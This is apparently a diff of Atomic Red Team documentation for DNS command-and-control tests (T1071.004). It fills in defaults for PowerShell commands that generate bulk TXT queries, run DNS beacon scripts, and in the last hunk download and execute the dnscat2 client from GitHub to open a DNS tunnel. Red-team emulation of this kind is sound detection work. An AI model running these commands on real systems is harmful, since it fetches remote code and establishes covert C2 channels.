@@ -525,7 +525,7 @@ A custom domain and sub-domain will need to be passed as input parameters for th
 <p><strong>Supported Platforms:</strong> windows</p>
 <div class="section" id="attack-commands-run-with-powershell">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="p">=</span><span class="n">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">-le</span> <span class="c">#{query_volume}; $i++) { Resolve-DnsName -type &quot;#{query_type}&quot; &quot;#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}&quot; -QuickTimeout}</span>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="p">=</span><span class="n">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">-le</span> <span class="n">1000</span><span class="p">;</span> <span class="nv">$i</span><span class="p">++)</span> <span class="p">{</span> <span class="nb">Resolve-DnsName</span> <span class="n">-type</span> <span class="s2">&quot;TXT&quot;</span> <span class="s2">&quot;atomicredteam.</span><span class="p">$(</span><span class="nb">Get-Random</span> <span class="n">-Minimum</span> <span class="n">1</span> <span class="n">-Maximum</span> <span class="n">999999</span><span class="p">)</span><span class="s2">.127.0.0.1.xip.io&quot;</span> <span class="n">-QuickTimeout</span><span class="p">}</span>
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -546,7 +546,7 @@ A custom domain and sub-domain will need to be passed as input parameters for th
 <div class="section" id="id1">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Set-Location</span> <span class="n">PathToAtomicsFolder</span>
-<span class="p">.\</span><span class="n">T1071</span><span class="p">.</span><span class="n">004</span><span class="p">\</span><span class="n">src</span><span class="p">\</span><span class="n">T1071-dns-beacon</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-Domain</span> <span class="c">#{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}</span>
+<span class="p">.\</span><span class="n">T1071</span><span class="p">.</span><span class="n">004</span><span class="p">\</span><span class="n">src</span><span class="p">\</span><span class="n">T1071-dns-beacon</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-Domain</span> <span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">xip</span><span class="p">.</span><span class="n">io</span> <span class="n">-Subdomain</span> <span class="n">atomicredteam</span> <span class="n">-QueryType</span> <span class="n">TXT</span> <span class="n">-C2Interval</span> <span class="n">30</span> <span class="n">-C2Jitter</span> <span class="n">20</span> <span class="n">-RunTime</span> <span class="n">30</span>
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -567,7 +567,7 @@ Upon execution, DNS information about the domain will be displayed for each call
 <div class="section" id="id2">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Set-Location</span> <span class="n">PathToAtomicsFolder</span>
-<span class="p">.\</span><span class="n">T1071</span><span class="p">.</span><span class="n">004</span><span class="p">\</span><span class="n">src</span><span class="p">\</span><span class="n">T1071-dns-domain-length</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-Domain</span> <span class="c">#{domain} -Subdomain #{subdomain} -QueryType #{query_type}</span>
+<span class="p">.\</span><span class="n">T1071</span><span class="p">.</span><span class="n">004</span><span class="p">\</span><span class="n">src</span><span class="p">\</span><span class="n">T1071-dns-domain-length</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-Domain</span> <span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">xip</span><span class="p">.</span><span class="n">io</span> <span class="n">-Subdomain</span> <span class="n">atomicredteamatomicredteamatomicredteamatomicredteamatomicredte</span> <span class="n">-QueryType</span> <span class="n">TXT</span>
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -589,7 +589,7 @@ The following blogs have more information.</p>
 <div class="section" id="id3">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">Webclient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1&#39;</span><span class="p">)</span>
-<span class="nb">Start-Dnscat2</span> <span class="n">-Domain</span> <span class="c">#{domain} -DNSServer #{server_ip}</span>
+<span class="nb">Start-Dnscat2</span> <span class="n">-Domain</span> <span class="n">example</span><span class="p">.</span><span class="n">com</span> <span class="n">-DNSServer</span> <span class="n">127</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span>
 </pre></div>
 </div>
 <div class="cell docutils container">
